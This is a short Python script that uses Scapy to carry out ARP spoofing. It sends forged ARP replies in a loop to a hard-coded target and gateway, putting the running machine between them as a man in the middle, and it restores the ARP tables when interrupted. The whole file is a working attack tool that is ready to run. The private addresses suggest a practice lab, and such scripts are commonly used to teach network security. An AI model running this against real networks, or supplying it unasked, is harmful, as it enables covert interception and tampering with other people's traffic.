import scapy.all as scapy
import time
from model.mac_manager import MacManager

class ARPspoofing:
    def __init__(self):
        self.mac_manager = MacManager()

    def get_mac(self, ip):
        return self.mac_manager.get_mac(ip)

    def spoof(self, target_ip, spoof_ip):
        target_mac = self.get_mac(target_ip)
        spoofed_packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
        scapy.send(spoofed_packet, verbose=False)

    def restore(self, target_ip, gateway_ip):
        target_mac = self.get_mac(target_ip)
        gateway_mac = self.get_mac(gateway_ip)
        self.mac_manager.restore_arp_tables(target_ip, target_mac, gateway_ip, gateway_mac)

    def arp_spoof(self, target_ip, gateway_ip):
        try:
            while True:
                self.spoof(target_ip, gateway_ip)
                self.spoof(gateway_ip, target_ip)
                print("\r[*] Packets Sent ", end="")
                time.sleep(2)  # Waits for two seconds

        except KeyboardInterrupt:
            print("\nCtrl + C pressed.............Exiting")
            self.restore(gateway_ip, target_ip)
            self.restore(target_ip, gateway_ip)
            print("[+] ARP Spoof Stopped")

if __name__ == "__main__":
    arp_spoofer = ARPspoofing()
    target_ip = "10.0.2.5"  # Enter your target IP
    gateway_ip = "10.0.2.1"  # Enter your gateway's IP
    arp_spoofer.arp_spoof(target_ip, gateway_ip)
